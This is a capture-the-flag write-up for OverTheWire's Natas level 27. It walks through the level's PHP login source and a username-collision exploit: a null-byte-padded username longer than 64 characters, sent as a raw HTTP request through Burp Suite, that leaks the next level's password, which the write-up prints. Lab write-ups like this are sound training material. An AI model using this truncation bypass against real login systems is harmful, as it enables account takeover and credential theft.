# Natas Level 26 → Level 27 Username Collision & Weak Server-side Logic (String Truncation)

## Previous Flag
<b>u3RRffXjysjgwFU6b9xa23i6prmUsYne</b>

## Goal
Username: natas27<br>
URL: http://natas27.natas.labs.overthewire.org<br>

Username:<br>
Password:<br>
login

## What I learned
```
mysqli_real_escape_string()         escape input safetly (No SQL injection)

Google: bypass mysqli_real_escape_string
https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602
Note: Doesn't apply to challenge

Find Logic Error:
    checkCredentials() matches a username and password against database
    validUser() and dumpData() only match username (depend on this, weakness detected)

Special Characters
    Filtered correctly no weakness

Whitespace padding
    natas28%00 (null-terminated)
        Wrong password for user: natas28%00
        Note: DB removing trailing whitespace from space or null-termination (truncated/trimmed)

Two Flaws on creating table
    username and password are limited to 64 characters
    username no uniq restriction
    If strict SQL mode is not enabled characters are truncated to fit else not stored in DB
        mySQL Documentation: https://dev.mysql.com/doc/refman/8.0/en/char.html?ref=learnhacking.io

Need to create a username that will bypass all checks (Fuzzing)
Fuzzing (or fuzz testing) is a software testing technique used to discover bugs, vulnerabilities, or unexpected behavior in programs by automatically providing random, invalid, or unexpected inputs

Burp Suite Intruder Attack Types:
    Sniper	            Tests one payload position at a time while keeping others fixed
    Battering Ram	    Uses the same payload in all positions, repeating it across the request
    Pitchfork	        Uses multiple payload sets in parallel, inserting one from each set per request
    Cluster Bomb	    Tests all combinations of multiple payload sets across all positions

Old Youtube Video (Not Work, educational): https://www.youtube.com/watch?v=2Sqt6QI7c0s 👻👻👻👻👻

Burp Suit for fuzzing:
Temporary project in memory: Use Burp defaults
Proxy: Open browser: http://natas27.natas.labs.overthewire.org 
Proxy: Intercept on and capture one POST
Right click send to Intruder (Ctrl + I) to configure parameters by placing between $ (add payload position)
    Before:     username=natas28&password=dam
    After:      username=$natas28$&password=$dam$
Attack Type: Battering ram
Payload Type: Numbers
Number Range:
    From: 00
    To: FF

Number Format:
    Min integer digits: 2
    Max integer digits: 2

Payload Processing:
    Add Prefix: %
    Add URL Decode: URL Decode

Start attack (Kinda need Burp Suite Professional)
```

## Solution
```
View source code
http://natas27.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "<censored>" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

function checkCredentials($link,$usr,$pass){
    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}

function validUser($link,$usr){
    $user=mysqli_real_escape_string($link, $usr);
    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);

    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){
    $user=mysqli_real_escape_string($link, trim($usr));
    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);

    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){
    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}

if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>'); 👀
    mysqli_select_db($link, 'natas27');

    if(validUser($link,$_REQUEST["username"])) { 👀👀
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){ 👀👀👀
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]); 👀👀👀👀 if already match dump data
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

Username: admin ⌨️
Password: admin ⌨️

User admin was created!

Username: admin ⌨️
Password: admin ⌨️

Welcome admin!
Here is your data:
Array ( [username] => admin [password] => admin )

Username: natas28 ⌨️
Password: iloveyouvirus ⌨️

Wrong password for user: natas28

Username: natas28 ⌨️  (Note: added 1 space after)
Password: ilovepizza ⌨️

Go away hacker

Temporary project in memory: Use Burp defaults
Proxy: Open browser: http://natas27.natas.labs.overthewire.org 
Proxy: Intercept On
Right click send to Repeater
Repeater: Importantant add null (%00) + natas28 is above 64 characters 🧠

POST /index.php HTTP/1.1
Host: natas27.natas.labs.overthewire.org
Content-Length: 206
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
Accept-Language: en-US,en;q=0.9
Origin: http://natas27.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas27.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&password=dam 👀

Look at Response:
HTTP/1.1 200 OK
Date: Thu, 07 Aug 2025 17:27:14 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1086
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
Welcome natas28!<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj 🔐
)
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Flag
<b>1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj</b>

## Continue
[Continue](./Natas2728.md)